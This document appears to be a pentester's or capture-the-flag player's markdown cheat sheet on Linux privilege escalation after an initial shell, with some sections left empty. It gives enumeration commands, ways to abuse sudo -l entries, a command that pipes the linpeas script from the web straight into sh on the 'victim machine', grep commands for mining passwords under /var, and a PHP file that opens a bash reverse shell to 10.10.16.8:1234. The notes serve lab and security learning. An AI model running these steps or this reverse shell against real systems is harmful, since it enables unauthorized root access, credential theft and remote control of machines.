---
sort : 7
---


# Privilege Escalation

A type of network attack used to gain unauthorized access to systems within a security perimeter.

## Got A Shell ?? 

All we need to do is to become a root.

`Here are the most important attack vectors to perform :`

### 1. Knowing the compromised users permissions
```bash
$ whoami  

$ id 
```

### 1.1 Kernel Exploits

```bash 
$ uname -a
# OR
$ cat /proc/version
# OR 
$ cat /etc/issue  

```

```warning
Don't use kernel exploits if you can avoid it. If you use it it might crash the machine or put it in an unstable state. 

Always use a simpler priv-esc if you can. They can also produce a lot of stuff in the sys.log. So if you find anything good, put it up on your list and keep searching for other ways before exploiting it.
```

### 1.2 Sudo -l 


```bash
$ sudo -l 

User [Username] may run the following commands on [Machine Name]:
    (root) NOPASSWD: /home/user/personal/stuff/AnyScript.sh

# How to read this ?? 
# the current user `Username` can run the command `/home/Username/personal/stuff/AnyScript.sh` as a `root` without password

$ sudo -u root /home/user/personal/stuff/AnyScript.sh


=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


User [Username] may run the following commands on [Machine Name]:
    (Username2) NOPASSWD: /home/Username2/luvit
    
# the current user `Username` can run the command `/home/Username2/luvit` as a `Username2` without password


$ sudo -u Username2 /home/Username2/luvit privesc.lua    # some times the command needs args to work ^^ 


=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


User [Username] may run the following commands on [Machine Name]:
    (Username2 : Username2) NOPASSWD: ALL

# the current user `Username` can run `ANY` command as a `Username2` OR it's group without password


$ sudo -u Username2 /bin/bash

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

User [Username] may run the following commands on [Machine Name]:
    (ALL) NOPASSWD:/bin/nano /opt/priv


# the current user `Username` can run `/bin/nano /opt/priv` command as `ANY USER` without password

sudo -u Username /bin/nano /opt/priv   # not root ?? 
```



### 2. Privilege Escalation Scripts

```bash 
# On Victime Machine 
$ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

some of what the script do is finding : 

1. User Installed Software : <br>
If you find anything google it for exploits.

```bash
# Common locations for user installed software
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
$ dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
```







### 2.5 Misconfiguration 





### 2.7 Passwords Mining 
```note
Logs / memory / History / Configuration files !! 
```

search deeper in /var/www/

```note
if i found multiple folders inside it ?? ==> this could indecte that the server is running multiple web apps !!! 
```

`inside /var` 
```bash
$ grep -roP 'passw.{0,30}' 2>/dev/null

$ grep -rP 'passw.{0,10}' -B5 -A5 --exclude '*.min.js' 2>/dev/null
$ grep -rP 'passw.{0,10}' -B5 -A5 --exclude '*.js' 2>/dev/null

# TRY : 
$ grep -rP 'Web.{0,10}' -B5 -A5 2>/dev/null | awk 'length >= 1 && length <= 2000' | grep --color -P "Web|"
```

```note	
grep will filter the files in each (non linked) folder recursivly. 
```





### 3. An Expedition Into System Files  

most of the time we gain a `broken shell` as www-data user .. SO .. try to write a php reverse shell file in any writeable folder inside `/var/www/` to get a better shell.
    
```note
`/var/www` is not the only place, it's just where the web server make it's actions.
```

```bash
$ find . -writable -type d
$ echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.8/1234 0>&1'\");" > shell.php  		# escape the double quotes inside a double qoutes ^^ to bypass the overlapping
```


### 1. Credential Exploitation